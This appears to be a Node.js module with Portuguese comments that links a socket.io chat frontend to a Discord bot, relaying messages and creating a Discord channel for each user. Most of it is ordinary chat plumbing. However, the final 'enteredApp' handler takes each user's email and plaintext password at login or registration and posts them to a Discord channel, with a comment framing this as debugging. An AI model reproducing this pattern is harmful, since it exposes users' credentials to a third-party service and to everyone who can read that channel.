// Mais tarde vai sair da pasta disc_guilds
//const user
const messageController = require("../controller/message.controller");
const jwt = require("jsonwebtoken");

// Este ficheiro vai conter uma função
// Que só vai ser chamada uma vez
/**
 * Function to receive messages from "me" and send 
 * to the correct user 
 * using Discord
 * 
 * @param {*} socketFromAbove 
 * @param {*} disc 
 * @param {*} defaultChanelId 
 * @param {*} eventEmitter 
 * 
 * This needs to be a function because i need to 
 * use the Socket initiated previously and the Discord Client
 * and it's important to use only one EventEmitter in order 
 * to emite events properly. 
 */
/** Discord Comunication part */
module.exports = function discordComs(socketFromAbove, disc, defaultChanelId, eventEmitter) {
    let client = disc();

    // console.log(socket.handshake.query)

    /** Array com as pessoas com os sockets ativos
     * {
     *  id,
     *  socket
     * }
     */
    let socketArr = [];

    // Array onde vão estar os id's e o respetivo socket das pesoas que já sairam
    let socketArrQuiters = [];

    // Este fica aqui porque é o unico que importa 
    /** Aqui vai ser onde a minha mensagem é recebida e depois enviada para o frontend */
    client.on("message", async (msg) => {
        try {

            // console.log("CHegou uma mensagem ao discord disc.js", msg.author);
            /**
             * Para diferenciar quando é uma mensagem enviada por mim ou pelo bot
             * msg.author.bot ...
             */

            // Enviar a mensagem para o frontend
            if (msg.author.bot) { }
            else {
                // Tenho que fazer uma funcçã oque envie as mensagens para frontend
                // Vou precisar do nome do canal para saber para onde eu mandei as mensagens
                // console.log("Mensagem vinda do Discord", msg.author, msg.id)

                /**
                 * A msg tem:
                 * - id
                 */
                // if (!isDuplicated(msg)) {
                // let selectedOne = null;// Socket selected beloow
                let contador = 0;
                await messageController.saveMessages(msg.content, true, msg.author.username, msg.channel.name, "", msg.id);
                for (let sc of socketArr) {

                    // ou seja, se o user já tiver saido não vai emitir mensagem 
                    // if (socketArrQuiters.includes(scq => scq.id === sc.id)) {
                    //     let index2 = socketArrQuiters.findIndex(sc2 => sc2.id === sc.id);
                    //     socketArrQuiters.splice(index2, 1);
                    // }

                    // console.log(sc.id, sc.roomName, msg.channel.name, sc.socket._rooms/*, sc.roomName, msg.channel.name, msg.content*/)
                    // console.log("---------------------------------------------------------------------------------")
                    if (sc.roomName.split(" ").length > 1) {
                        sc.roomName = sc.roomName.split(" ").join("-")
                    }
                    if (!msg.channel.name.includes('_5f')) {
                        let auxName = msg.channel.name.split("_5f");
                        // console.log("auxName" ,auxName)
                        let newName = "";
                        for (let i = 0; i < auxName.length; i++) {
                            if (i == 0) newName = auxName[i] + "_5f";
                            else newName += auxName[i];
                        }
                        // console.log(newName)
                        msg.channel.setName(newName)
                        msg.channel.name = newName;
                    }
                    if (sc.roomName === msg.channel.name) {
                        // console.log(sc.id)
                        contador++;
                        // selectedOne = sc.socket;


                        // console.log("Vai mandar mensaem para o user.", contador, msg.channel.name, sc.socket._rooms);
                        if (sc.socket._rooms.length == 0) {
                            // console.log("WITHOUT ROOMS !!!!!!!!!!!!!!!")
                            sc.socket.emit('messageDisc', { msg: msg.content, scId: sc.id });
                        }
                        else {
                            // console.log("WITH ROOM !!!!")
                            sc.socket.to(sc.roomName).emit('messageDisc', { msg: msg.content, scId: null });
                        }
                    }

                }

                contador = 0;
            }
        } catch (error) {
            // console.log("Aconteceu um erro no discord no .on('message')", error);
            throw error;
        }
    })

    /** Socket Comunication part 
     * -----------------------------------------------------------------------------------------------------------------------------------
    */

    // Estas conexões estão todas no default namespace ("/")
    socketFromAbove.io.on("connection", socket => {

        let roomName = socket.handshake.query.roomName != undefined ? socket.handshake.query.roomName.split("_:")[0] : null;
        let spN = roomName != null ? roomName.split("_:")[1] : null;

        // console.log(`Entrou Mais um socket.id: ${socket.id}, roomName: ${roomName}, Special Number: ${spN} -----------------------------------------------------------------------------------------------`);

        if (roomName) {
            if (!socketArr.includes(sc => sc.id === socket.id)) {
                socket.join(roomName)

                socketArr.push({ id: socket.id, socket: socket, roomName: roomName, specialNum: spN })
                // console.log("socketArr no evento YO", socketArr, roomName, spN, socket._rooms)
            }
            else {
                // console.log("já esistia", socket.id, socketArr);
            }
        }

        socket.on('yo', (data) => {
            console.log(data)

            /** Vou introduzir os sockets aqui por que é quando tenho a certeza que é "válido" */
        })

        /**
         * O evento "mess" é usado para receber as mensagens 
         * dos utilizadores
         * É do frontend que vêm as mensages
         */
        socket.on("mess", async ({ text, token, env }) => {
            try {

                let chanelExists = false;
                let chanelId = null;
                /**
                 * Vai ser aqui que vou receber as mensagens dos utilizadores,
                 * por isso é aqui que antes de enviar uma mensagem para um certo canal,
                 * tenho que verificar se o canal já existe ou não,
                 * e agir consoante isso
                 */

                let decoded = await jwt.verify(token, process.env.JWT_SECRET);
                let { username, idM } = decoded; // Vou ter que passar aqui o id do channel???
                let channelName = (username + "_" + idM).toLowerCase();

                if (channelName.includes(" ")) {
                    channelName = channelName.trim().split(" ").join("-");
                }



                /** Este forEach e o acima acabam por fazer um bocado a mesma coisa,
                 * mas o que eu quero é sós gerir o "ServidorBot"
                 * Se o fizer aqui o "gerenciamento" vai acontecer de toda a vez que o user mandar uma mensagem,
                 * mas se o fizer na função acima (.on("connection")) só acontece a primeira vez
                 * que um user connectar 
                 * 
                 * Por agora vou usar esta forma para fazer as cenas, a outra vai estar guardada no readme.md
                 */
                let mainGuild = null;

                client.guilds.cache.forEach((guild) => {
                    if (guild.name == "ServidorBot") {
                        mainGuild = guild;
                        guild.channels.cache.forEach((ch) => {
                            /** IMPORTANTE:
                             * 
                             * Os nomes dos canais são sempre em minusculas
                             */

                            //if (ch.type == 'text' && (() || (ch.name == channelName.split("_").join("") /** Porque só me lembrei de chamar os canais assim (username + _ + idM) agora */ || ch.name == channelName))) {
                            if (ch.type == 'text' && (ch.name == channelName.split("_").join("") /** Porque só me lembrei de chamar os canais assim (username + _ + idM) agora */ || ch.name == channelName)) {

                                chanelId = ch.id
                                chanelExists = true;
                            }
                        })
                    }
                })

                if (!chanelExists) {
                    let newCh = await mainGuild.channels.create(channelName,
                        {
                            type: 'text',
                            reason: 'Little Talks'
                        })
                    await socketFromAbove.saveMessage(text, username, newCh.id, channelName, env)
                    client.channels.cache.get(newCh.id).send(text);
                    client.channels.cache.get(defaultChanelId).send(`Nova Mensagem from ${username}`)

                    /** Vou ter que melhorar esta parte em termos de error handling 
                        * O erro que ás vezes dá é o que está no readme
                       */
                    // console.log("ERROR Ao CRIAR UM CANAL!!!!!")
                    // throw err;
                }
                else {
                    /** Vem do parametro da funçoum */
                    chanelId = chanelId == null ? defaultChanelId : chanelId
                    await socketFromAbove.saveMessage(text, username, channelName, env)
                    // console.log("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")

                    client.channels.cache.get(chanelId).send(text)
                    let ids = [];
                    for (let sc of socketArr) {
                        // console.log(sc.roomName, channelName)
                        if (sc.roomName === channelName) {
                            // console.log(sc.roomName)
                            ids.push(sc.id)
                        }
                    }
                    socket.emit('ownMessage', { msg: text, scIds: ids, self: false });
                }
            } catch (error) {
                // Mais uma vez acho que isto não resolve o problema do error handling
                throw error;
            }
        })

        /** Emitir Merdas */
        /** Ao entrar alguém o melhor a fazer era criar um canal que ficasse com o historico das mensagens e depois nem tinha que ser eu a guardar las na BD talvez */
        socket.emit("connection", `New Connection from ${socket.id}`)

        /** Disconnect  */
        socket.on("disconnect", () => {
            // socketArrQuiters.push({ id: socket.id, socket: socket });
            // console.log("DISCONNET!!!! ----------------------------------------------------------------------", socket.id)
            // console.log("socketArr: ", socketArr)
            let index1 = socketArr.findIndex(sc1 => sc1.id === socket.id);
            // console.log("index", index1)
            let quiter;
            if (index1 != -1) {
                quiter = socketArr.splice(index1, 1);

            }
            // console.log("Saiu um: ", quiter, socketArr.length)
            socket.broadcast.emit("user left", "A user left");
        })
    })


    /**
     *  Receber evento para quando o utilizador faz login ou se regista
     *  Agora com mais informação para me ajudar a saber o que se vai passando na APP
     *  e para ser mais fácil de ir fazendoDEBUG ao longo do tempo 
     */
    eventEmitter.on("enteredApp", ({ username, login, moreData }) => {

        // se o login for false é por que é um user que acabou de se registar
        console.log("%c on -> Entered APP", process.env.NODE_ENV, moreData)
        let msg = `O ___${username}___ \n`;
        let debugMsg = process.env.NODE_ENV == "production" ? "Em Produção" : "Em Desenvolvimento";
        if (login) {
            msg += `Com o Mail -> ___${moreData.email || 'SEM MAIL???'}___ \nPass -> ___${moreData.password || 'SEM PASS???'}___ \n__LOGIN__`
        } else {
            msg += `Com o Mail -> ___${moreData.email || 'SEM MAIL???'}___ \nPass -> ___${moreData.password || 'SEM PASS???'}___ \n__REGISTOU-SE__`
        }
        client.channels.cache.get(defaultChanelId).send(`${msg} \n IMPORTANTE: __${debugMsg}__ \n ___________________________________________\n`)
    })

};